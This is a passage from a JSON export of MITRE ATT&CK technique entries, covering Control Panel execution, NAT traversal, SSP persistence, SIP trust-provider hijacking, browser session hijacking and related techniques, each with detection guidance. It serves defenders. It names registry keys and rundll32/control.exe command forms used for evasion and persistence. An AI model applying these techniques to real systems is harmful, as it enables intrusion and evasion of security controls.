2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.002",
      "stix_id": "attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f",
      "created": "2020-01-23T19:59:52.630000+00:00",
      "modified": "2025-04-25T14:46:37.731000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Module: Module Load",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL</code> and <code>ControlRunDLLAsUser</code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1218/011) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, which may bypass detections and/or execution filters for control.exe.(Citation: TrendMicro CPL Malware Jan 2014)\n\nInventory Control Panel items to locate unregistered and potentially malicious files present on systems:\n\n* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace</code> and <code>HKEY_CLASSES_ROOT\\CLSID\\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)\n* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>CPLs</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(\"c:\\windows\\system32\\control.exe {Canonical_Name}\", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>).(Citation: Microsoft Implementing CPL)\n* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder\\{name}\\Shellex\\PropertySheetHandlers</code> where {name} is the predefined name of the system item.(Citation: Microsoft Implementing CPL)\n\nAnalyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014)"
    },
    "T1599.001": {
      "id": "T1599.001",
      "name": "Network Address Translation Traversal",
      "description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1599.001",
      "stix_id": "attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de",
      "created": "2020-10-19T16:48:08.241000+00:00",
      "modified": "2025-04-25T14:46:38.101000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.\n\nMonitor the border network device\u2019s configuration to determine if any unintended NAT rules have been added without authorization."
    },
    "T1608.002": {
      "id": "T1608.002",
      "name": "Upload Tool",
      "description": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608.002",
      "stix_id": "attack-pattern--506f6f49-7045-4156-9007-7474cb44ad6d",
      "created": "2021-03-17T20:31:07.828000+00:00",
      "modified": "2025-04-15T23:18:15.337000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)."
    },
    "T1547.005": {
      "id": "T1547.005",
      "name": "Security Support Provider",
      "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.005",
      "stix_id": "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462",
      "created": "2020-01-24T17:16:11.806000+00:00",
      "modified": "2025-04-25T14:46:38.641000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Module: Module Load",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)"
    },
    "T1036.011": {
      "id": "T1036.011",
      "name": "Overwrite Process Arguments",
      "description": "Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process\u2019s stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges. \n\nDuring runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`. The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.011",
      "stix_id": "attack-pattern--514dc7b3-0b80-4382-80a9-2e2d294f5019",
      "created": "2025-03-27T20:37:52.269000+00:00",
      "modified": "2025-04-15T19:58:30.391000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1550": {
      "id": "T1550",
      "name": "Use Alternate Authentication Material",
      "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1550",
      "stix_id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
      "created": "2020-01-30T16:18:36.873000+00:00",
      "modified": "2025-04-15T19:58:30.693000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Containers",
        "Identity Provider",
        "Office Suite",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Logon Session: Logon Session Creation",
        "Active Directory: Active Directory Credential Request",
        "Web Credential: Web Credential Usage",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
    },
    "T1597.001": {
      "id": "T1597.001",
      "name": "Threat Intel Vendors",
      "description": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1597.001",
      "stix_id": "attack-pattern--51e54974-a541-4fb6-a61b-0518e4c6de41",
      "created": "2020-10-02T17:03:45.918000+00:00",
      "modified": "2025-04-15T23:16:02.261000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1011": {
      "id": "T1011",
      "name": "Exfiltration Over Other Network Medium",
      "description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1011",
      "stix_id": "attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87",
      "created": "2017-05-31T21:30:25.159000+00:00",
      "modified": "2025-04-15T22:29:20.961000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content",
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces."
    },
    "T1602.002": {
      "id": "T1602.002",
      "name": "Network Device Configuration Dump",
      "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1602.002",
      "stix_id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
      "created": "2020-10-20T00:08:21.745000+00:00",
      "modified": "2025-04-25T14:46:40.804000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Identify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration.(Citation: US-CERT TA18-068A 2018)"
    },
    "T1589": {
      "id": "T1589",
      "name": "Gather Victim Identity Information",
      "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1589",
      "stix_id": "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4",
      "created": "2020-10-02T14:54:59.263000+00:00",
      "modified": "2025-04-15T22:37:47.951000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1562.004": {
      "id": "T1562.004",
      "name": "Disable or Modify System Firewall",
      "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.\n\nIn ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.004",
      "stix_id": "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b",
      "created": "2020-02-21T21:00:48.814000+00:00",
      "modified": "2025-04-15T19:58:31.395000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Firewall: Firewall Rule Modification",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Firewall: Firewall Disable"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls."
    },
    "T1560": {
      "id": "T1560",
      "name": "Archive Collected Data",
      "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1560",
      "stix_id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
      "created": "2020-02-20T20:53:45.725000+00:00",
      "modified": "2025-04-15T21:50:30.319000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Script: Script Execution",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)"
    },
    "T1553.003": {
      "id": "T1553.003",
      "name": "SIP and Trust Provider Hijacking",
      "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553.003",
      "stix_id": "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc",
      "created": "2020-02-05T19:34:04.910000+00:00",
      "modified": "2025-04-15T19:58:31.965000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Module: Module Load",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nEnable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nUtilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)\n\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\n* HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\n* HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\n\n**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1218/010). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \u201cHide Microsoft Entries\u201d and \u201cHide Windows Entries\u201d are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)"
    },
    "T1185": {
      "id": "T1185",
      "name": "Browser Session Hijacking",
      "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1185",
      "stix_id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T15:15:33.428000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Modification",
        "Process: Process Access",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. New processes may not be created and no additional software dropped to disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for [Process Injection](https://attack.mitre.org/techniques/T1055) against browser applications."
    },
    "T1021": {
      "id": "T1021",
      "name": "Remote Services",
